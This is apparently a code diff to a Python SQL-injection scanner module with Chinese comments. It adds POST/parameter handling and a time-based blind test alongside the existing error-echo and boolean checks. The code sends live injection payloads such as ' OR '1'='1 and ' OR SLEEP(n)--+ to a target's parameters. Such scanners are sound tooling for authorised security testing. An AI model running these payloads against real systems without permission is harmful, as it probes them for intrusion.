@@ -1,7 +1,8 @@
 # -*- coding: utf-8 -*-
-"""SQL 注入检测：错误回显 + 布尔盲注"""
+"""SQL 注入检测：错误回显 + 布尔盲注 + 时间盲注"""
+import time
 import requests
-from urllib.parse import quote_plus
+from . import common
 
 # 数据库报错时常见的错误关键字
 SQL_ERRORS = [
@@ -14,34 +15,43 @@ SQL_ERRORS = [
 ]
 
 
-def _inject(url, payload):
-    """把 payload 追加到 URL 参数值后面（自动 URL 编码）"""
-    return url + quote_plus(payload)
+def _payload(params, pname, value):
+    """复制一份参数，并把指定参数的值改成 value"""
+    p = dict(params)
+    p[pname] = value
+    return p
 
 
-def sqli_check(url):
-    """返回结构化结果（dict）"""
+def sqli_check(url, data=None, param=None, sleep_sec=3):
+    """对指定参数做 SQL 注入检测，返回结构化结果"""
+    method, base, params = common.parse_target(url, data)
+    pname = common.pick_param(params, param)
     result = {
         "module": "sqli",
         "target": url,
+        "param": pname,
         "vulnerable": False,
         "technique": None,
         "payload": None,
         "evidence": None,
     }
+    if pname is None:
+        result["error"] = "目标没有可注入的参数"
+        return result
+    orig = params.get(pname, "")
 
     # 1) 基线请求
     try:
-        base = requests.get(url, timeout=5)
+        r0 = common.send(method, base, params)
     except requests.RequestException as e:
         result["error"] = str(e)
         return result
-    result["baseline"] = {"status": base.status_code, "length": len(base.content)}
+    result["baseline"] = {"status": r0.status_code, "length": len(r0.content)}
 
     # 2) 错误回显测试
-    inj = _inject(url, "'")
+    p = _payload(params, pname, orig + "'")
     try:
-        r = requests.get(inj, timeout=5)
+        r = common.send(method, base, p)
     except requests.RequestException:
         r = None
     if r is not None:
@@ -50,21 +60,20 @@ def sqli_check(url):
             if marker in body:
                 result["vulnerable"] = True
                 result["technique"] = "错误回显"
-                result["payload"] = "'"
+                result["payload"] = orig + "'"
                 result["evidence"] = marker
-                result["test_url"] = inj
+                result["test"] = common.display(method, base, p)
                 return result
 
     # 3) 布尔盲注测试
-    true_url = _inject(url, "' OR '1'='1")
-    false_url = _inject(url, "' AND '1'='2")
+    p_true = _payload(params, pname, orig + "' OR '1'='1")
+    p_false = _payload(params, pname, orig + "' AND '1'='2")
     try:
-        r_true = requests.get(true_url, timeout=5)
-        r_false = requests.get(false_url, timeout=5)
+        r_true = common.send(method, base, p_true)
+        r_false = common.send(method, base, p_false)
     except requests.RequestException:
         result["error"] = "布尔测试请求失败"
         return result
-
     diff = abs(len(r_true.content) - len(r_false.content))
     result["boolean"] = {
         "true_len": len(r_true.content),
@@ -74,5 +83,24 @@ def sqli_check(url):
     if diff > 50:
         result["vulnerable"] = True
         result["technique"] = "布尔盲注"
-        result["payload"] = "' OR '1'='1"
+        result["payload"] = orig + "' OR '1'='1"
+        result["test"] = common.display(method, base, p_true)
+        return result
+
+    # 4) 时间盲注测试
+    p_sleep = _payload(params, pname, orig + f"' OR SLEEP({sleep_sec})--+")
+    try:
+        t0 = time.time()
+        common.send(method, base, p_sleep)
+        elapsed = time.time() - t0
+    except requests.RequestException:
+        result["error"] = "时间盲注请求失败"
+        return result
+    result["timing"] = {"elapsed": round(elapsed, 2), "threshold": sleep_sec - 1}
+    if elapsed >= sleep_sec - 1:
+        result["vulnerable"] = True
+        result["technique"] = "时间盲注"
+        result["payload"] = orig + f"' OR SLEEP({sleep_sec})--+"
+        result["test"] = common.display(method, base, p_sleep)
+
     return result
